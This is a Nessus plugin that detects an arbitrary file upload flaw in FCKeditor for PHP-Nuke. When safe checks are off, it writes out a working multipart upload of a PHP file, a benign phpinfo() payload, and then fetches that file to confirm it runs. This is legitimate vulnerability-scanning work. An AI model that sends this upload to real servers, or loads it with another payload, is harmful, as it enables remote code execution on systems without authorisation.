#
# (C) Tenable Network Security
#
# 


desc["english"] = "
The remote host is running a version of the FCKeditor addon for
PHP-Nuke that allows a remote attacker to upload arbitrary files and
run them in the context of the web server user. 

Solution : Upgrade to FCKeditor version 2.0 RC3 or later.
Risk factor : High";


if (description) {
  script_id(17239);
  script_version("$Revision: 1.5 $");

  script_cve_id("CAN-2005-0613");
  script_bugtraq_id(12676);

  name["english"] = "FCKeditor for PHP-Nuke Arbitrary File Upload Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Detects arbitrary file upload vulnerability in FCKeditor for PHP-Nuke";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencie("http_version.nasl", "no404.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


foreach dir (make_list(
  "",
  "/nuke",
  "/demo",
  "/phpnuke/html",
  "/php_nuke/html",
  "/php",
  "/phpnew",
  "/nuke50",
  "/nuke60",
  "/nuke65",
  "/nuke70",
  "/nuke71",
  "/nuke72",
  "/nuke73",
  "/nuke74"
)) {
  if (safe_checks()) {
    req = http_get(item:dir + "/modules.php?name=FCKeditor", port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if ( res == NULL ) exit(0);

    # according to _docs/whatsnew.html in the source, an Image button was
    # added in version 1.6.0 so it's probably safe to treat everything
    # from that through 2.0 RC2 as vulnerable.
    if (egrep(pattern:"<br>FCKeditor (1\.6|2\.0 (BETA|RC1|RC2)) ", string:res, icase:TRUE)) {
      desc = str_replace(
        string:desc["english"],
        find:"Solution :",
        replace:string(
          "***** Nessus has determined the vulnerability exists on the target\n",
          "***** simply by looking at the version number of FCKeditor\n",
          "***** installed there.\n",
          "\n",
          "Solution :"
        )
      );
      security_hole(port:port, data:desc);
      exit(0);
    }
  }  
  else {
    # Try to exploit it.
    fname = "nessus-plugin.gif.php";
    req = string(
      "POST ",  dir, "/modules/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=Image&CurrentFolder=/ HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="Newfile"; filename="', fname, '"', "\r\n",
      "Content-Type: image/gif\r\n",
      "\r\n",
      # NB: This is the actual exploit code; you could put pretty much
      #     anything you want here.
      "<? phpinfo() ?>\r\n",
  
      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req);
    if (res == NULL) exit(0);           # can't connect

    # Now retrieve the "image" we just uploaded.
    #
    # nb: ServerPath defaults to "/modules/FCKeditor/upload" 
    #     in FCKeditor w/ PHP-Nuke.
    serverpath = "/modules/FCKeditor/upload";
    url = string(dir, serverpath, "/Image/", fname);
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if (res == NULL) exit(0);           # can't connect

    # If we could run it, there's a problem.
    if (egrep(pattern:"PHP Version", string:res, icase:TRUE)) {
      desc = str_replace(
        string:desc["english"],
        find:"Solution :",
        replace:string(
          "**** Nessus has successfully exploited this vulnerability by uploading\n",
          "**** an image file with PHP code that reveals information about the\n",
          "**** PHP configuration on the remote host. The file is located under\n",
          "**** the web server's document directory as:\n",
          "****          ", dir, serverpath, "/Image/", fname, "\n",
          "**** You are strongly encouraged to delete this file as soon as\n",
          "**** possible as it can be run by anyone who accesses it remotely.\n",
          "\n",
          "Solution :"
        )
      );
      security_hole(port:port, data:desc);
      exit(0);
    }
  }
}
